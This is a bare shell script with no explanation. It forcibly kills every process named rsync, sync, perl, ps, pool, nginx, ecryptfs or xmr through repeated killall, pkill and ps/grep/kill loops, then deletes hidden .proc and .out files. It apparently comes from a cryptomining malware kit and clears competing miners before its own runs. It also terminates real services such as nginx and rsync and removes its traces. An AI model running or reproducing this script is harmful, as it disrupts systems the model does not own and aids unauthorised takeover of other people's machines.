#!/bin/sh
killall -9 rsync > .out
killall -9 sync > .out
killall -9 perl> .out
killall -9 ps
killall -9 pool>.out
killall -9 nginx>.out
killall -9 ecryptfs>.out
killall -9 xmr>.out

pkill -9 ps
pkill -9 pool
pkill -9 nginx
pkill -9 ecryptfs
pkill -9 xmr
pkill -9 sync

kill -9 `ps x|grep ps|grep -v grep|awk '{print $1}'`> .out
kill -9 `ps x|grep sync|grep -v grep|awk '{print $1}'`> .out
kill -9 `ps x|grep nginx|grep -v grep|awk '{print $1}'`> .out
kill -9 `ps x|grep ecryptfs|grep -v grep|awk '{print $1}'`> .out
kill -9 `ps x|grep xmr|grep -v grep|awk '{print $1}'`> .out
kill -9 `ps x|grep perl|grep -v grep|awk '{print $1}'`> .out
kill -9 `ps x|grep rsync|grep -v grep|awk '{print $1}'`> .out
for pid in $(ps -ef | grep "rsync" | awk '{print $2}'); do kill -9 $pid; done> .out
for pid in $(ps -ef | grep "sync" | awk '{print $2}'); do kill -9 $pid; done> .out
pkill -9 rsync> .out
pkill -9 perl> .out
pkill -9 ps>.out
rm -rf .proc .out

